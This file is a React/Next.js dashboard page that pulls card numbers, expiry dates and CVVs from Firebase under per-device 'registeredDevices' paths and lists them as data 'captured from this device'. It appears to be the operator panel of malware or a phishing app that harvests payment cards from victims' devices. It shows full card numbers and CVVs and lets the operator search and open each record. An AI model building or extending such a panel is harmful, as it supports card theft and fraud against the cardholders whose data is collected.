"use client";

import { useParams, useRouter } from "next/navigation";
import { useEffect, useState } from "react";
import { db } from "@/lib/firbase";
import { ref, onValue } from "firebase/database";
import { Card, CardBody, CardHeader, Button, Input } from "@heroui/react";
import Navbar from "@/components/Navbar";
import Sidebar from "@/components/Sidebar";
import Link from "next/link";

interface CardPayment {
  id: string;
  card?: string;
  cvv?: string;
  expiry?: string;
  timestamp?: number | string;
}

export default function CardsPage() {
  const params = useParams();
  const router = useRouter();
  const deviceId = decodeURIComponent(params.deviceId as string);

  const [cards, setCards] = useState<CardPayment[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");

  useEffect(() => {
    if (!deviceId) return;

    const cardRef = ref(db, `registeredDevices/${deviceId}/card_payment_data`);

    const unsubscribe = onValue(
      cardRef,
      (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.val();
          const cardList: CardPayment[] = Object.entries(data).map(
            ([key, value]: [string, any]) => ({
              id: key,
              card: value.card || "",
              cvv: value.cvv || "",
              expiry: value.expiry || "",
              timestamp: value.timestamp || "",
            }),
          );
          setCards(cardList);
        } else {
          setCards([]);
        }
        setLoading(false);
      },
      (error) => {
        console.error("Error fetching cards:", error);
        setLoading(false);
      },
    );

    return () => unsubscribe();
  }, [deviceId]);

  const filteredCards = cards.filter(
    (card) =>
      card.card?.slice(-4).includes(searchTerm) ||
      card.expiry?.includes(searchTerm),
  );

  const formatTimestamp = (timestamp: any) => {
    if (!timestamp) return "N/A";
    const date = new Date(Number(timestamp));
    return date.toLocaleString();
  };

  return (
    <div className="page-shell">
      <div className="page-frame">
        <Sidebar />

        <main className="page-main">
          <Navbar
            title="Card Payments"
            subtitle="All card payment data captured from this device"
          />

          <nav className="mb-6 flex items-center gap-2 text-sm text-[var(--text-muted)]">
            <Link
              href="/devices"
              className="transition hover:text-[var(--text-main)]"
            >
              Devices
            </Link>
            <span>/</span>
            <Link
              href={`/devices/${deviceId}`}
              className="transition hover:text-[var(--text-main)]"
            >
              {deviceId}
            </Link>
            <span>/</span>
            <span className="text-[var(--text-main)]">Cards</span>
          </nav>

          <Card className="bg-[var(--surface)] border border-[var(--border)]">
            <CardHeader className="border-b border-[var(--border)] px-6 py-4 flex-col items-start gap-4">
              <div className="flex w-full items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-[var(--text-main)]">
                    Card Payments
                  </h2>
                  <p className="text-sm text-[var(--text-muted)] mt-1">
                    Total: {filteredCards.length} cards
                  </p>
                </div>
                <Button
                  isIconOnly
                  className="bg-[var(--surface-muted)] text-[var(--text-main)] hover:bg-slate-700"
                  onPress={() => router.back()}
                >
                  <svg
                    className="h-5 w-5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M15 19l-7-7 7-7"
                    />
                  </svg>
                </Button>
              </div>
              <Input
                placeholder="Search by card number or expiry..."
                value={searchTerm}
                onValueChange={setSearchTerm}
                className="w-full"
                classNames={{
                  input: "bg-[var(--surface-muted)] text-[var(--text-main)]",
                  inputWrapper:
                    "bg-[var(--surface-muted)] border-[var(--border)]",
                  label: "text-[var(--text-muted)]",
                }}
              />
            </CardHeader>

            <CardBody className="p-6">
              {loading ? (
                <div className="flex items-center justify-center p-8">
                  <p className="text-[var(--text-muted)]">Loading cards...</p>
                </div>
              ) : filteredCards.length === 0 ? (
                <div className="flex flex-col items-center justify-center p-12">
                  <svg
                    className="h-12 w-12 text-[var(--text-muted)] mb-3 opacity-50"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={1.5}
                      d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
                    />
                  </svg>
                  <p className="text-[var(--text-muted)]">
                    No card payments found
                  </p>
                </div>
              ) : (
                <div className="space-y-4">
                  {filteredCards.map((card, idx) => (
                    <div
                      key={card.id}
                      className="rounded-lg border border-[var(--border)] bg-[var(--surface-muted)] p-4 hover:border-purple-500/50 transition-colors"
                    >
                      <div className="flex items-start justify-between mb-4 pb-3 border-b border-[var(--border)]">
                        <div>
                          <h3 className="text-sm font-semibold text-[var(--text-main)]">
                            Card: {card.card}
                          </h3>
                          <p className="text-xs text-[var(--text-muted)] mt-1">
                            {formatTimestamp(card.timestamp)}
                          </p>
                        </div>
                        <Button
                          isIconOnly
                          size="sm"
                          className="bg-purple-500/20 text-purple-300 hover:bg-purple-500/30"
                          onPress={() => {
                            window.open(
                              `data:text/html,<pre>${JSON.stringify(card, null, 2)}</pre>`,
                              "_blank",
                            );
                          }}
                        >
                          <svg
                            className="h-4 w-4"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"
                            />
                          </svg>
                        </Button>
                      </div>
                      <div className="grid grid-cols-2 gap-4 sm:grid-cols-3">
                        {card.card && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Card Number
                            </p>
                            <p className="font-mono text-sm text-purple-400 font-semibold">
                              {card.card}
                            </p>
                          </div>
                        )}
                        {card.expiry && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              Expiry
                            </p>
                            <p className="font-mono text-sm text-[var(--text-main)] font-semibold">
                              {card.expiry}
                            </p>
                          </div>
                        )}
                        {card.cvv && (
                          <div>
                            <p className="text-xs text-[var(--text-muted)] mb-1">
                              CVV
                            </p>
                            <p className="font-mono text-sm text-yellow-400">
                              {card.cvv}
                            </p>
                          </div>
                        )}
                        <div>
                          <p className="text-xs text-[var(--text-muted)] mb-1">
                            Unique ID
                          </p>
                          <p className="font-mono text-xs text-slate-400 truncate">
                            {card.id}
                          </p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardBody>
          </Card>
        </main>
      </div>
    </div>
  );
}
